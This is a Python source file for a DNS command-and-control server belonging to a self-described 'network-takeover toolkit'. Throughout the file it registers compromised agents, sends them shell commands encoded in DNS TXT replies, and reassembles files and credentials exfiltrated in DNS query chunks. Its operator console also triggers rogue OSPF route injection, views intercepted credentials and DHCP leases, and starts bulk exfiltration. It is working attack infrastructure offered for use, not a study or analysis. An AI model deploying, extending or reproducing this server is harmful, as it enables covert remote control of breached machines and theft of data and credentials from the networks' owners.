#!/usr/bin/env python3
# v1.1
"""
c2_server.py — DNS C2 server for the network-takeover toolkit.

Pairs with dns_c2.py (the agent-side library loaded by main.py --remote).
Listens on UDP/53 using a plain OS socket (no Scapy raw injection), so it
works correctly whether or not a VPN is active on the server host.

Protocol (wire-compatible with dns_tunnel_server.py):
  hello.<agent_id>.<domain>               A   → register agent, return dummy A
  status.<agent_id>.<domain>              TXT → "ACK" / "NONE"
  command.<domain>                        TXT → b32(cmd) / "NONE"
  <b32chunk>.<seq>.<total>.<sid>.<domain> A   → exfiltration chunk

Exfiltrated payloads prefixed with FILE:<name>: are saved to INTERCEPT_DIR.
All other payloads are appended to OUTPUT_FILE.

All DNS answer RRs carry TTL=1 to minimise resolver caching of tunnel traffic.
The OPT pseudo-RR TTL remains 0 (it carries EDNS flags, not a caching interval).

Operator console:
  bash <cmd>    queue a shell command for ALL connected agents
  clear         cancel the pending command (agents get NONE on next poll)
  agents        list registered agents with last-seen age
  sessions      show in-progress chunk-reassembly sessions
  q / quit      shut down the server

Setup:
  - NS record for <domain> must delegate to this server's public IP.
  - Run as root (binding UDP/53 requires it).
  - Open UDP/53 inbound in the firewall.
  - Agents poll command.<domain> every COMMAND_POLL_INTERVAL seconds (default 60s
    in dns_c2.py); commands queued here are delivered on the next poll cycle.
"""

import base64
import datetime
import os
import socket
import threading
import time

from scapy.layers.dns import DNS, DNSRR, DNSRRSOA

VERSION = "v1.0"
DOMAIN = "d.lootforge.org"
NS_HOST = "cwmkeg.lootforge.org"
OUTPUT_FILE = "c2_exfiltrated.txt"
INTERCEPT_DIR = "c2_intercepts"

# Pre-computed for fast subdomain extraction; reassigned by argparse if --domain set.
_DOMAIN_LABELS: list = DOMAIN.split(".")
_DOMAIN_LEN: int = len(_DOMAIN_LABELS)

# ── Shared mutable state ──────────────────────────────────────────────────────
_cmd_lock = threading.Lock()
_cmd_state = {"current": "NONE"}   # broadcast to every agent polling command.<domain>
_agent_cmds: dict = {}             # agent_id → cmd; per-agent slot, polled via command.<id>.<domain>

_session_lock = threading.Lock()
_sessions: dict = {}               # sid → {chunks: {idx: str}, total: int, src_ip: str}

_agents_lock = threading.Lock()
_agents: dict = {}                 # agent_id → {first_seen: float, last_seen: float, ip: str}

_stop_event = threading.Event()


# ── Encoding ──────────────────────────────────────────────────────────────────

def _b32dec(s: str) -> bytes:
    s = s.upper()
    return base64.b32decode(s + "=" * ((8 - len(s) % 8) % 8))


def _b32enc(s: str) -> bytes:
    return base64.b32encode(s.encode())


# ── Server IP discovery ───────────────────────────────────────────────────────

def _detect_server_ip() -> str:
    """Determine this host's outbound IP via a connect-trick (no packets sent)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "127.0.0.1"


SERVER_IP = _detect_server_ip()


# ── Output / persistence ──────────────────────────────────────────────────────

def _notify(msg: str) -> None:
    """Print a highlighted notification then re-display the prompt."""
    print(f"\n{'=' * 60}")
    print(msg)
    print("=" * 60)
    print(">>> ", end="", flush=True)


def _save(session_id: str, raw: bytes, src_ip: str) -> None:
    """Persist a fully-reassembled exfiltration payload to disk."""
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # dns_c2.exfiltrate_file() prepends FILE:<basename>: before binary content.
    if raw.startswith(b"FILE:"):
        try:
            colon2 = raw.index(b":", 5)
            fname = raw[5:colon2].decode("utf-8", errors="ignore")
            content = raw[colon2 + 1:]
            os.makedirs(INTERCEPT_DIR, exist_ok=True)
            dest = os.path.join(INTERCEPT_DIR, fname)
            with open(dest, "wb") as fh:
                fh.write(content)
            _notify(
                f"  FILE RECEIVED\n"
                f"  Session  : {session_id}\n"
                f"  Source   : {src_ip}\n"
                f"  Filename : {fname}  ({len(content):,} B)\n"
                f"  Saved →  : {dest}"
            )
            return
        except (ValueError, OSError):
            pass  # malformed FILE header — fall through to plain text save

    try:
        text = raw.decode("utf-8")
    except Exception:
        text = f"[binary {len(raw)} B]  {raw[:80].hex()}"

    with open(OUTPUT_FILE, "a", encoding="utf-8") as fh:
        fh.write(f"[{ts}] [{session_id}] [{src_ip}] {text}\n")

    _notify(
        f"  DATA RECEIVED\n"
        f"  Session  : {session_id}\n"
        f"  Source   : {src_ip}\n"
        f"  Time     : {ts}\n"
        f"  Payload  : {text[:300]}"
    )


# ── DNS response builders ─────────────────────────────────────────────────────
# All answer/authority RRs use ttl=1 to minimise resolver caching.
# OPT pseudo-RR uses ttl=0 — its TTL field carries EDNS extended RCODE/flags.

def _soa_rr(zone: bytes) -> DNSRRSOA:
    serial = int(datetime.datetime.now().strftime("%Y%m%d%H"))
    return DNSRRSOA(
        rrname=zone, ttl=1,
        mname=(NS_HOST + ".").encode(),
        rname=("hostmaster." + DOMAIN + ".").encode(),
        serial=serial, refresh=3600, retry=900, expire=604800, minimum=1,
    )


def _opt() -> DNSRR:
    return DNSRR(rrname=b".", type=41, rclass=4096, ttl=0, rdata=b"")


def _resp_soa(req: DNS) -> bytes:
    zone = (DOMAIN + ".").encode()
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0,
                     qd=req.qd, an=_soa_rr(zone), ar=_opt()))


def _resp_ns(req: DNS) -> bytes:
    zone = (DOMAIN + ".").encode()
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
                     an=DNSRR(rrname=zone, type="NS", ttl=1,
                               rdata=(NS_HOST + ".").encode()),
                     ar=_opt()))


def _resp_a(req: DNS) -> bytes:
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
                     an=DNSRR(rrname=req.qd.qname, type="A", ttl=1, rdata=SERVER_IP),
                     ar=_opt()))


def _resp_txt(req: DNS, txt: bytes) -> bytes:
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, qd=req.qd,
                     an=DNSRR(rrname=req.qd.qname, type="TXT", ttl=1, rdata=txt),
                     ar=_opt()))


def _resp_nxdomain(req: DNS) -> bytes:
    zone = (DOMAIN + ".").encode()
    return bytes(DNS(id=req.id, qr=1, aa=1, rd=0, rcode=3, qd=req.qd,
                     ns=_soa_rr(zone), ar=_opt()))


# ── Data reassembly ───────────────────────────────────────────────────────────

def _handle_data_chunk(sub: list, src_ip: str) -> bool:
    """
    Parse a chunked exfiltration subdomain and accumulate into _sessions.
    Wire format: <b32chunk>.<seq>.<total>.<sid>
    Returns True if the format matched (triggers an A response to the client).
    """
    if len(sub) < 4:
        return False
    session_id = sub[-1]
    try:
        total = int(sub[-2])
        idx   = int(sub[-3])
        chunk = sub[-4]
    except (ValueError, IndexError):
        return False

    full_b32 = None
    saved_src = src_ip

    with _session_lock:
        if session_id not in _sessions:
            _sessions[session_id] = {"chunks": {}, "total": total, "src_ip": src_ip}
            print(f"\n[+] New session {session_id} from {src_ip} ({total} chunk(s))")
        _sessions[session_id]["chunks"][idx] = chunk
        received = len(_sessions[session_id]["chunks"])
        if received == total:
            full_b32 = "".join(
                _sessions[session_id]["chunks"][i] for i in range(total)
            )
            saved_src = _sessions[session_id]["src_ip"]
            del _sessions[session_id]

    if full_b32 is not None:
        try:
            assembled = _b32dec(full_b32)
        except Exception as exc:
            print(f"\n[!] Decode error session={session_id}: {exc}")
            return True
        threading.Thread(
            target=_save, args=(session_id, assembled, saved_src), daemon=True,
        ).start()
    else:
        print(f"[~] Session {session_id}: {received}/{total}")

    return True


# ── Per-packet request handler ────────────────────────────────────────────────

def _handle(data: bytes, addr: tuple, sock: socket.socket) -> None:
    src_ip, _ = addr
    try:
        dns = DNS(data)
    except Exception:
        return
    if dns.qr != 0 or dns.qdcount == 0:
        return

    qname = dns.qd.qname.decode("utf-8", errors="ignore").rstrip(".").lower()
    qtype = dns.qd.qtype

    if qname != DOMAIN and not qname.endswith("." + DOMAIN):
        return

    sub = qname.split(".")[:-_DOMAIN_LEN]
    print(f"[DNS] {src_ip} → {qname}  type={qtype}")

    def reply(payload: bytes) -> None:
        try:
            sock.sendto(payload, addr)
        except OSError as exc:
            print(f"[!] sendto {addr}: {exc}")

    # Zone apex
    if not sub:
        reply(_resp_ns(dns) if qtype == 2 else _resp_soa(dns))
        return

    # command.<domain> — global broadcast command slot
    if sub == ["command"]:
        with _cmd_lock:
            cmd = _cmd_state["current"]
        payload = b"NONE" if cmd == "NONE" else _b32enc(cmd)
        print(f"[CMD] → {payload.decode()[:80]}")
        reply(_resp_txt(dns, payload))
        return

    # command.<agent_id>.<domain> — per-agent command slot (checked first by dns_c2)
    if len(sub) == 2 and sub[0] == "command":
        agent_id = sub[1]
        with _cmd_lock:
            # Pop the per-agent command if one is queued; fall back to broadcast.
            cmd = _agent_cmds.pop(agent_id, None) or _cmd_state["current"]
        payload = b"NONE" if (not cmd or cmd == "NONE") else _b32enc(cmd)
        print(f"[CMD-{agent_id}] → {payload.decode()[:80]}")
        reply(_resp_txt(dns, payload))
        return

    # hello.<agent_id>.<domain> — register or heartbeat
    if len(sub) == 2 and sub[0] == "hello":
        agent_id = sub[1]
        now = time.time()
        with _agents_lock:
            is_new = agent_id not in _agents
            if is_new:
                _agents[agent_id] = {"first_seen": now, "last_seen": now, "ip": src_ip}
            else:
                _agents[agent_id]["last_seen"] = now
                _agents[agent_id]["ip"] = src_ip
        if is_new:
            _notify(
                f"  NEW AGENT REGISTERED\n"
                f"  ID   : {agent_id}\n"
                f"  IP   : {src_ip}\n"
                f"  Time : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        else:
            print(f"[HB]  {agent_id} heartbeat from {src_ip}")
        reply(_resp_a(dns))
        return

    # status.<agent_id>.<domain> — respond ACK if agent is registered
    if len(sub) == 2 and sub[0] == "status":
        agent_id = sub[1]
        with _agents_lock:
            known = agent_id in _agents
        txt = b"ACK" if known else b"NONE"
        print(f"[HS]  {agent_id} → {txt.decode()}")
        reply(_resp_txt(dns, txt))
        return

    # Data exfiltration chunks
    if _handle_data_chunk(sub, src_ip):
        reply(_resp_a(dns))
        return

    reply(_resp_nxdomain(dns))


# ── Server loop ───────────────────────────────────────────────────────────────

def run_server(host: str = "0.0.0.0", port: int = 53) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((host, port))
    except OSError as exc:
        print(f"[!] Cannot bind UDP {host}:{port} — {exc}")
        _stop_event.set()
        return
    sock.settimeout(1.0)
    print(f"[*] Listening on UDP {host}:{port}")
    while not _stop_event.is_set():
        try:
            data, addr = sock.recvfrom(4096)
        except socket.timeout:
            continue
        except OSError as exc:
            if not _stop_event.is_set():
                print(f"[!] Socket error: {exc}")
            break
        threading.Thread(
            target=_handle, args=(data, addr, sock), daemon=True,
        ).start()
    sock.close()


# ── Operator console ──────────────────────────────────────────────────────────

_SHOW_SUBS = {"svis", "neighbors", "lsdb", "leases", "creds", "status"}


def _queue_agent(agent_id: str, cmd: str, poll_interval: int) -> None:
    """Store cmd in the per-agent slot and print a delivery hint."""
    with _cmd_lock:
        _agent_cmds[agent_id] = cmd
    encoded = _b32enc(cmd).decode()
    with _agents_lock:
        known = agent_id in _agents
    print(f"[*] Queued for {agent_id}: '{cmd}'")
    print(f"    Encoded (b32) : {encoded}")
    if not known:
        print(f"    WARNING: agent {agent_id!r} not yet registered — command held until handshake")
    else:
        print(f"    Delivery      : within {poll_interval}s (next poll cycle)")


def _console(poll_interval: int = 60) -> None:
    """
    Operator console.  Per-agent commands use the targeted slots polled via
    command.<agent_id>.<domain>; global commands use command.<domain>.

    ── Global (broadcast to every agent) ──────────────────────────────────
      bash <cmd>                  queue shell command for ALL agents
      clear                       cancel the global pending command
      agents                      list registered agents + last-seen age
      sessions                    list in-progress chunk-reassembly sessions
      q / quit                    shut down

    ── Per-agent (targeted; use agent ID shown by 'agents') ───────────────
      show <id> svis              OSPF Hello sources + LSDB subnets
      show <id> neighbors         live OSPF neighbour table
      show <id> lsdb              live LSDB entries
      show <id> leases            active DHCP leases issued by rogue server
      show <id> creds             intercepted traffic listing + credential log
      show <id> status            brief agent status summary
      inject <id> <prefix>        inject OSPF stub route (CIDR or addr/mask)
      exfil <id>                  transmit all intercepted files + cred log
      cmd <id> <raw>              send any raw command string to one agent
    """
    sep = "─" * 56
    print(f"\n{sep}")
    print("  DNS C2 Operator Console")
    print(f"{sep}")
    print("  Global : bash <cmd>  |  clear  |  agents  |  sessions  |  q")
    print("  Target : show <id> <svis|neighbors|lsdb|leases|creds|status>")
    print("           inject <id> <prefix>  |  exfil <id>  |  cmd <id> <raw>")
    print(f"{sep}\n")

    while not _stop_event.is_set():
        try:
            print(">>> ", end="", flush=True)
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            _stop_event.set()
            return

        if not line:
            continue

        tokens = line.split(None, 3)   # up to 4 tokens: verb [id] [sub] [extra]
        verb = tokens[0].lower()

        # ── Shutdown ──────────────────────────────────────────────────────────
        if verb in ("q", "quit"):
            _stop_event.set()
            return

        # ── Global: cancel pending command ────────────────────────────────────
        if verb == "clear":
            with _cmd_lock:
                _cmd_state["current"] = "NONE"
            print("[*] Global command cleared.")

        # ── Global: list agents ───────────────────────────────────────────────
        elif verb in ("agents", "list"):
            with _agents_lock:
                snap = dict(_agents)
            if not snap:
                print("[*] No agents registered yet.")
            else:
                now = time.time()
                print(f"\n  {'ID':<14s}  {'IP':<18s}  {'First seen':<10s}  Last seen")
                print(f"  {'─'*14}  {'─'*18}  {'─'*10}  {'─'*14}")
                for aid, info in sorted(snap.items(), key=lambda x: -x[1]["last_seen"]):
                    age = int(now - info["last_seen"])
                    first = datetime.datetime.fromtimestamp(
                        info["first_seen"]
                    ).strftime("%H:%M:%S")
                    print(f"  {aid:<14s}  {info['ip']:<18s}  {first:<10s}  {age}s ago")
                print()

        # ── Global: list in-progress reassembly sessions ──────────────────────
        elif verb == "sessions":
            with _session_lock:
                snap = {sid: dict(s) for sid, s in _sessions.items()}
            if not snap:
                print("[*] No in-progress sessions.")
            else:
                for sid, s in snap.items():
                    pct = int(100 * len(s["chunks"]) / max(s["total"], 1))
                    print(f"  {sid}  {len(s['chunks'])}/{s['total']} ({pct}%)  from={s['src_ip']}")

        # ── Global: bash <cmd> — broadcast shell command to all agents ─────────
        elif verb == "bash" and len(tokens) >= 2:
            cmd = "bash:" + line[5:].lstrip()   # normalise to bash: prefix
            with _cmd_lock:
                _cmd_state["current"] = cmd
            encoded = _b32enc(cmd).decode()
            with _agents_lock:
                n = len(_agents)
            print(f"[*] Global command  : '{cmd}'")
            print(f"    Encoded (b32)   : {encoded}")
            print(f"    Pending agents  : {n} — delivery within {poll_interval}s")

        # ── Per-agent: show <id> <sub> ────────────────────────────────────────
        elif verb == "show" and len(tokens) >= 3:
            agent_id, sub = tokens[1], tokens[2].lower()
            if sub not in _SHOW_SUBS:
                print(f"[!] Unknown show target {sub!r}.  Choose: {', '.join(sorted(_SHOW_SUBS))}")
            else:
                _queue_agent(agent_id, f"menu:{sub}", poll_interval)

        # ── Per-agent: inject <id> <prefix> ──────────────────────────────────
        elif verb == "inject" and len(tokens) >= 3:
            agent_id, prefix = tokens[1], tokens[2]
            _queue_agent(agent_id, f"menu:inject:{prefix}", poll_interval)

        # ── Per-agent: exfil <id> ────────────────────────────────────────────
        elif verb == "exfil" and len(tokens) >= 2:
            agent_id = tokens[1]
            _queue_agent(agent_id, "menu:exfil", poll_interval)

        # ── Per-agent: cmd <id> <raw> — arbitrary targeted command ───────────
        elif verb == "cmd" and len(tokens) >= 3:
            agent_id = tokens[1]
            raw = line.split(None, 2)[2]   # everything after "cmd <id>"
            _queue_agent(agent_id, raw, poll_interval)

        else:
            print(f"[!] Unknown command: {line!r}"
                  "  (type 'agents' for help, 'q' to quit)")


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    ap = argparse.ArgumentParser(
        description=f"DNS C2 Server {VERSION}",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("--domain", default=DOMAIN, metavar="ZONE",
                    help="Authoritative DNS zone")
    ap.add_argument("--ns", default=NS_HOST, metavar="HOSTNAME",
                    help="NS glue hostname")
    ap.add_argument("--port", type=int, default=53, metavar="PORT",
                    help="UDP listen port")
    ap.add_argument("--output", default=OUTPUT_FILE, metavar="FILE",
                    help="Exfiltration log file")
    ap.add_argument("--intercepts", default=INTERCEPT_DIR, metavar="DIR",
                    help="Directory for received files")
    ap.add_argument("--poll-interval", type=int, default=60, metavar="SECS",
                    help="Agent poll interval (informational — controls console hints)")
    args = ap.parse_args()

    # Reassign module globals before any thread starts.
    DOMAIN = args.domain
    NS_HOST = args.ns
    OUTPUT_FILE = args.output
    INTERCEPT_DIR = args.intercepts
    _DOMAIN_LABELS = DOMAIN.split(".")
    _DOMAIN_LEN = len(_DOMAIN_LABELS)

    os.makedirs(INTERCEPT_DIR, exist_ok=True)

    print("=" * 60)
    print(f"  DNS C2 Server {VERSION}")
    print(f"  Zone        : {DOMAIN}")
    print(f"  NS          : {NS_HOST}")
    print(f"  Server IP   : {SERVER_IP}  (returned in A record responses)")
    print(f"  Output      : {OUTPUT_FILE}")
    print(f"  Intercepts  : {INTERCEPT_DIR}/")
    print(f"  TTL         : 1s  (all answer RRs)")
    print(f"  Poll hint   : agents check in every {args.poll_interval}s")
    print("=" * 60)

    threading.Thread(
        target=run_server, kwargs={"port": args.port}, daemon=True,
    ).start()

    try:
        _console(poll_interval=args.poll_interval)
    except KeyboardInterrupt:
        _stop_event.set()

    print("\n[*] Server stopped.")
